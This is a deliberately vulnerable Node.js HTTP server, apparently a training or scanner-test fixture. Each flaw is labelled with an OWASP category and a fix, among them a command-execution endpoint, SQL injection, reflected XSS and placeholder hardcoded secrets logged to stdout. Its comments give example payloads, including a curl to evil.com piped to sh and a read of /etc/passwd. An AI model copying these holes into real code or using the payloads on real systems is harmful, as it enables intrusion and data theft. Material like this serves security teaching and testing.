// VULNERABILITY: HTTP instead of HTTPS (OWASP A02 - Cryptographic Failures)
// All traffic is unencrypted. Sensitive data (passwords, queries) can be
// intercepted via man-in-the-middle attacks. Fix: use HTTPS / TLS termination.
const http = require('http');

// VULNERABILITY: Command Injection import - child_process exec() (OWASP A03)
// Importing exec allows shell commands to be run. If user input reaches exec(),
// it results in full Remote Code Execution (RCE).
const { exec } = require('child_process');

// VULNERABILITY: Deprecated API (LOW)
// url.parse() is deprecated and has known parsing quirks that can lead to
// SSRF and auth-bypass. Fix: use the WHATWG URL API (new URL(req.url)).
const url = require('url');

const port = process.env.PORT || 8080;

// VULNERABILITY: Hardcoded RSA Private Key (CRITICAL - OWASP A02)
// Private keys must never be committed to source control. Anyone with repo
// access can impersonate the service or decrypt traffic.
// Fix: load from Azure Key Vault or environment variable at runtime.
const PRIVATE_KEY = `-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2a2rwplBQLzHPZe5ekSKj/UiGLC4bvdFOFqMnQKv4CFbBhSP
pSqDuqMcJWFuuqzAQWFMn0yFMNXnQbpG2hCQmhFs5tI8BF5OQZKABCDEFGHIJKL
MNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/AAABBBCCCDDDEEE
FFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZaaa
bbbcccdddeeefffggghhh==
-----END RSA PRIVATE KEY-----`;

// VULNERABILITY: Hardcoded DB Password (CRITICAL - OWASP A02)
// Fix: use process.env.DB_PASSWORD loaded from a secrets manager.
const DB_PASSWORD = "admin123";

// VULNERABILITY: Hardcoded Live API Key (CRITICAL - OWASP A02)
// sk_live_ prefix indicates a real Stripe production key. Rotate immediately.
// Fix: use process.env.STRIPE_API_KEY.
const apiKey = "sk_live_1234567890abcdef";

// VULNERABILITY: Hardcoded AWS Secret Key (CRITICAL - OWASP A02)
// AWS secret access key format. Gives full AWS API access if leaked.
// Fix: use IAM roles / instance profiles, never hardcode.
const AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";

// VULNERABILITY: Hardcoded Admin Credentials (CRITICAL - OWASP A07 - Auth Failures)
// Weak default credentials hardcoded in source. No password policy, no MFA,
// no session management. Fix: use an identity provider, never hardcode credentials.
const ADMIN_USER = "admin";
const ADMIN_PASS = "password123";

// VULNERABILITY: Missing Rate Limiting (MEDIUM - OWASP A05)
// No rate limiting on any endpoint. Allows brute force attacks, credential
// stuffing, and DoS. Fix: use a rate limiting middleware (e.g. express-rate-limit).

// VULNERABILITY: Missing Security Headers (HIGH)
// No Content-Security-Policy, X-Content-Type-Options, Strict-Transport-Security,
// X-Frame-Options, Referrer-Policy headers set anywhere.
// Fix: use helmet middleware or set headers manually on every response.

const server = http.createServer((req, res) => {

  // VULNERABILITY: Sensitive Data in Logs (HIGH - OWASP A09)
  // Logging full URLs exposes query strings which may contain tokens or PII.
  // Fix: sanitize URLs before logging, never log query parameters raw.
  console.log(`Request received: ${req.method} ${req.url}`);

  const parsedUrl = url.parse(req.url, true);

  if (req.url === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'OK' }));
    return;
  }

  // VULNERABILITY: Command Injection / RCE (CRITICAL - OWASP A03)
  // VULNERABILITY: Unauthenticated Sensitive Endpoint (CRITICAL - OWASP A01)
  // User input from query string passed directly to exec() with no auth,
  // no validation, no sanitization. Allows full container takeover.
  // e.g. /run?cmd=cat+/etc/passwd or /run?cmd=curl+evil.com/shell.sh|sh
  // Fix: remove this endpoint entirely. If shell-out is required, use
  // execFile() with a fixed binary and allowlist of arguments only.
  if (parsedUrl.pathname === '/run') {
    const cmd = parsedUrl.query.cmd;
    exec(cmd, (err, stdout) => {
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      // VULNERABILITY: Verbose Error Exposure (MEDIUM - OWASP A05)
      // err?.message leaks internal error details to the client.
      // Fix: return a generic error message, log the real error server-side.
      res.end(stdout || err?.message);
    });
    return;
  }

  // VULNERABILITY: SQL Injection (CRITICAL - OWASP A03)
  // VULNERABILITY: Unauthenticated Sensitive Endpoint (CRITICAL - OWASP A01)
  // User input from query string interpolated directly into SQL string.
  // e.g. /user?id=' OR '1'='1 dumps entire users table.
  // Fix: use parameterized queries e.g. db.query('SELECT * FROM users WHERE id = ?', [userId])
  if (parsedUrl.pathname === '/user') {
    const userId = parsedUrl.query.id;
    const query = `SELECT * FROM users WHERE id = '${userId}'`;
    // VULNERABILITY: Sensitive Data in Logs (HIGH - OWASP A09)
    // Logging raw SQL with user input exposes query structure and user data.
    console.log("Executing query:", query);
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end(`Query: ${query}`);
    return;
  }

  // VULNERABILITY: Reflected XSS (HIGH - OWASP A03)
  // User input from query string interpolated directly into HTML response
  // without escaping. e.g. /hello?name=<script>alert(document.cookie)</script>
  // Fix: HTML-escape name before rendering, or set Content-Type: text/plain.
  if (parsedUrl.pathname === '/hello') {
    const name = parsedUrl.query.name || 'World';
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(`<h1>Hello, ${name}!</h1>`);
    return;
  }

  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Hello from Azure App Service running Docker!\n');
});

server.listen(port, '0.0.0.0', () => {
  console.log(`Server running on port ${port}`);
  // VULNERABILITY: Sensitive Data in Logs (HIGH - OWASP A09)
  // Logging secrets to stdout exposes them in container logs and log aggregators.
  // Fix: never log secrets. Remove these lines.
  console.log(`DB_PASSWORD: ${DB_PASSWORD}`);
  console.log(`API Key: ${apiKey}`);
});
